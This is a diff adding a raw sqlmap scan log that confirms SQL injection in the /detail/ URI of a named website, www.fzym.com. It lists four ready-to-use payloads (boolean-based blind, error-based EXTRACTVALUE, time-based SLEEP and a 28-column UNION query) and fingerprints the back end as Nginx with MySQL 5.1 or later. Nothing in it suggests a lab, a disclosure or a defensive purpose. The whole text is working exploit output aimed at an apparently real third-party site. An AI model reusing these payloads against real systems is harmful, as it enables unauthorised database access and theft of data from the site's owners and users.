@@ -1,0 +1,21 @@
+sqlmap identified the following injection point(s) with a total of 150 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: http://www.fzym.com/detail/-1' OR 11611=6 AND 000142=000142 or 'SnvkFfx1'='') OR NOT 8319=8319#
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: http://www.fzym.com/detail/-1' OR 11611=6 AND 000142=000142 or 'SnvkFfx1'='') AND EXTRACTVALUE(2052,CONCAT(0x5c,0x716b6a6b71,(SELECT (ELT(2052=2052,1))),0x717a6a7071))-- nRyI
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://www.fzym.com/detail/-1' OR 11611=6 AND 000142=000142 or 'SnvkFfx1'='') AND (SELECT 5062 FROM (SELECT(SLEEP(5)))sVbH)-- WFSY
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 28 columns
+    Payload: http://www.fzym.com/detail/-1' OR 11611=6 AND 000142=000142 or 'SnvkFfx1'='') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b6a6b71,0x7759516f74585174675470776d7a49416a777869767a776843416c4a7168577443655a454d714f6a,0x717a6a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+---
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.1
